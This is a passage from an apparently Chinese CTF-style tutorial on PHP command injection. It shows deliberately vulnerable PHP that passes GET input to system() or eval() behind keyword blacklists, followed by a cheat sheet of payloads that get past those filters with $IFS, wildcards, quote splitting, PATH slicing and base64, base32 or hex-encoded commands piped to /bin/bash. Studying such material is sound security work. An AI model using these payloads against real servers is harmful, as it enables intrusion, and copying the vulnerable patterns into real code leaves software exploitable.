+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">    system(&quot;ls&quot;.$cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">?cmd=&amp;&amp;id</span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>|</strong></p>
+<ul>
+<li>把前面命令的执行结果当成后面命令的参数</li>
+<li>如果都为真，则都执行，但只显示最后命令的执行结果</li>
+</ul>
+<p><strong>||</strong></p>
+<ul>
+<li>类似于if-else语句</li>
+<li>若前面的命令执行成功，则后面的命令不执行</li>
+<li>若前面的命令执行失败，则后面的命令被执行</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&quot;&gt;/dev/null 2&gt;&amp;1&quot;  把正常输出和错误输出全部丢掉</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">payload:</span></span><br><span class="line"><span class="comment">?cmd=id||</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="0x05-绕过方式"><a href="#0x05-绕过方式" class="headerlink" title="0x05  绕过方式"></a>0x05  绕过方式</h1><h2 id="过滤命令执行函数"><a href="#过滤命令执行函数" class="headerlink" title="过滤命令执行函数"></a>过滤命令执行函数</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/exec|system|popen|proc_open|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你是黑客么？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">尝试未被过滤的命令函数，如passthru()</span></span><br><span class="line"><span class="comment">payload:</span></span><br><span class="line"><span class="comment">?cmd=passthru(&#x27;ls&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;# #&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;过滤后的命令：&quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;&lt;/br &gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;命令执行结果如下：&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>大括号{}</strong></p>
+<ul>
+<li>可以将要执行的内容包含在{}内部进行执行</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;<span class="built_in">ls</span>,-l&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>$IFS</strong></p>
+<ul>
+<li>$IFS是linux系统的特殊环境变量，叫做内部字段分隔符</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span><span class="variable">$IFS</span>-l</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>IFS被bash解释器当成变量名，加一个{}就可以固定变量名</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span><span class="variable">$&#123;IFS&#125;</span>-l</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>$IFS$9 后的$与{}类似，起隔断作用</li>
+<li>$9是当前系统shell进程第九个参数持有者，始终为空字符</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span>$IFS<span class="variable">$9</span>-l</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>重定向字符</strong></p>
+<ul>
+<li>&lt;表示输入重定向</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">cat</span>&lt;flag.php</span><br><span class="line">?cmd=<span class="built_in">cat</span>&lt;&gt;flag.php</span><br><span class="line">?cmd=<span class="built_in">ls</span>&lt;&gt;-l</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>%09(tab)</strong></p>
+<ul>
+<li>%09是tab键的URL编码值</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span>%09-l</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h2><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;命令有问题哦，来黑我丫！！！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>通配符绕过</strong></p>
+<ul>
+<li><code>?</code>在linux中可以代替字母。<code>?</code>仅代表单个字符串，但此单字必须存在</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fl?g.p?p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>*</code>在linux中可以进行模糊匹配。<code>*</code>可以代表任何字符串。</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla*&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>单引号、双引号绕过</strong></p>
+<ul>
+<li>可以代表空字符</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla&quot;&quot;g.ph&quot;&quot;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">?cmd=passthru(<span class="string">&quot;cat fla&#x27;&#x27;g.ph&#x27;&#x27;p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>反斜杠绕过</strong></p>
+<ul>
+<li>去掉特殊字符的功能性，单纯表示为字符串</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla\g.ph\p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>特殊变量</strong></p>
+<ul>
+<li>输出的结果为空</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$9</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$@</span></span><br><span class="line"><span class="built_in">echo</span> $*</span><br><span class="line"><span class="comment">#$1到$9，$@和$*输出结果都为空</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$10</span> </span><br><span class="line"><span class="comment">#输出 0 </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$11</span> </span><br><span class="line"><span class="comment">#输出 1</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>$1到$9</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla$1g.ph$9p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>$@和$*</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat fla$@g.ph$@p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>内联执行</strong></p>
+<ul>
+<li>自定义字符串，在拼接起来</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;a=f;b=la;c=g;d=.;e=ph;f=p;cat $a$b$c$d$e$f&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>利用linux中的环境变量</strong></p>
+<ul>
+<li>使用环境变量里的字符执行变量</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PATH默认系统环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;PATH:x:y&#125;</span></span><br><span class="line"><span class="comment"># x代表环境变量中的第几位，y代表总共几位，第一位从0开始</span></span><br><span class="line"></span><br><span class="line">eg: </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:5:1&#125;</span></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">l</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>构造payload</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&#x27;cat f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;g.p?p&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="文件读取命令绕过"><a href="#文件读取命令绕过" class="headerlink" title="文件读取命令绕过"></a>文件读取命令绕过</h2><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|cat|sort|shell|\&#x27;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再来黑我丫！！！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>tac</strong></p>
+<ul>
+<li>与<code>cat</code>功能相似，但是反向显示，从最后一行往前开始显示</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;tac fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>more</strong></p>
+<ul>
+<li>一页一页的显示文档内容</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;more fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>less</strong></p>
+<ul>
+<li>与<code>more</code>类似</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;less fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>tail</strong></p>
+<ul>
+<li>默认显示最后10行</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;tail fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>nl</strong></p>
+<ul>
+<li>显示的时候顺便输出行号</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;nl fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>od</strong></p>
+<ul>
+<li>以二进制的方式读取档案内容</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;od -A d -c fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>xxd</strong></p>
+<ul>
+<li>读取二进制文件</li>
+<li>需要安装</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;xxd fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>sort</strong></p>
+<ul>
+<li>主要用于排序文件</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;s?rt fl\ag.ph\p&quot;</span>);</span><br><span class="line">?cmd=passthru(<span class="string">&quot;/usr/bin/s?rt fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>uniq</strong></p>
+<ul>
+<li>报告或删除文件中重复的行</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;uniq fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>file -f</strong></p>
+<ul>
+<li><p>-f   查看文件中的文件名的文件类型，会显示报错的内容</p>
+</li>
+<li><p>报错出具体内容</p>
+</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;file -f fl\ag.ph\p&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>grep</strong></p>
+<ul>
+<li>在文本中查找指定的字符串</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(<span class="string">&quot;grep fla fl\ag.ph\p&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#从 fl\ag.ph\p 文本文件中查找包含 fla 字符串的行</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|cat|sort|shell/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再来黑我丫！！！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>base64编码绕过</strong></p>
+<ul>
+<li>python编码</li>
+</ul>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">b&#x27;payload&#x27;</span></span><br><span class="line">e64 = base64.b64encode(s)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数S的类型必须是字节包(bytes)</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>绕过过程</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload编码 ---&gt; 目标服务器 ---&gt; 执行命令</span><br><span class="line">          绕过过滤      解码读取命令</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>payload</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat flag.php ---&gt; Y2F0IGZsYWcucGhw</span></span><br><span class="line"><span class="comment"># base -d ---&gt; base64解码</span></span><br><span class="line"><span class="comment"># /bin/bash ---&gt; 执行命令</span></span><br><span class="line"></span><br><span class="line">?cmd=system(<span class="string">&#x27;echo &quot;Y2F0IGZsYWcucGhw&quot;|base64 -d|/bin/bash&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>base32编码绕过</strong></p>
+<ul>
+<li><p>与<code>base64编码</code>绕过类似</p>
+</li>
+<li><p>python编码</p>
+</li>
+</ul>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">b&#x27;payload&#x27;</span></span><br><span class="line">e32 = base64.b32encode(s)</span><br><span class="line"><span class="built_in">print</span>(e32)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数S的类型必须是字节包(bytes)</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>payload</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat flag.php ---&gt; MNQXIIDGNRQWOLTQNBYA====</span></span><br><span class="line"><span class="comment"># base -d ---&gt; base64解码</span></span><br><span class="line"><span class="comment"># /bin/bash ---&gt; 执行命令</span></span><br><span class="line"></span><br><span class="line">?cmd=system(<span class="string">&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>HEX编码</strong></p>
+<ul>
+<li><p>16进制</p>
+</li>
+<li><p>python编码</p>
+</li>
+</ul>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">s = <span class="string">b&#x27;payload&#x27;</span></span><br><span class="line">h = binascii.b2a_hex(s)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数s的类型必须是字节包(bytes)</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>payload</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cat flag.php ---&gt; 63617420666c61672e706870</span><br><span class="line"># xxd ---&gt; 二进制显示和处理文件工具</span><br><span class="line"># -r -p ---&gt; 将纯十六进制转储的输出打印为ASCII格式</span><br><span class="line"># /bin/bash ---&gt; 执行命令</span><br><span class="line"></span><br><span class="line">?cmd=system(&#x27;echo &quot;63617420666c61672e706870&quot;|xxd -r -p|/bin/bash&#x27;);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>shellcode</strong></p>
+<ul>
+<li>16进制机器码，本质上是一段汇编指令</li>
+<li>payload</li>
+</ul>
